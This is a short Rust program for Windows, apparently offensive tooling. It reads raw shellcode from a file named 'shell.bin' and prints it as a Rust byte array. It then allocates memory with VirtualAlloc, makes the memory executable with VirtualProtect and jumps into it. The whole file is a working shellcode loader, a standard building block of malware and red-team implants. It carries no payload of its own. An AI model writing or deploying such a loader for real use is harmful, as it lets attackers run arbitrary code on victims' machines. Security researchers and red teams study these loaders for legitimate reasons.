use std::fs::File;
use std::io::Read;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use std::ptr;

fn main() -> std::io::Result<()> {
    println!("[+] Small Program to execute shellcode from bin and execute and display <>");

    let mut file = File::open("shell.bin")?;
    let mut shellcode = Vec::new();
    file.read_to_end(&mut shellcode)?;

    print!("let shellcode: [u8; {}] = [", shellcode.len());
    for (i, byte) in shellcode.iter().enumerate() {
        if i > 0 {
            print!(", ");
        }
        print!("0x{:02x}", byte);
    }
    println!("];");

    // Execute shellcode
    unsafe {
        let mem = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if mem.is_null() {
            return Err(std::io::Error::last_os_error());
        }

        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());

        let mut old_protect = 0;
        let result = VirtualProtect(
            mem,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        if result == 0 {
            return Err(std::io::Error::last_os_error());
        }

        let func: extern "C" fn() = std::mem::transmute(mem);
        func();
    }

    Ok(())
}

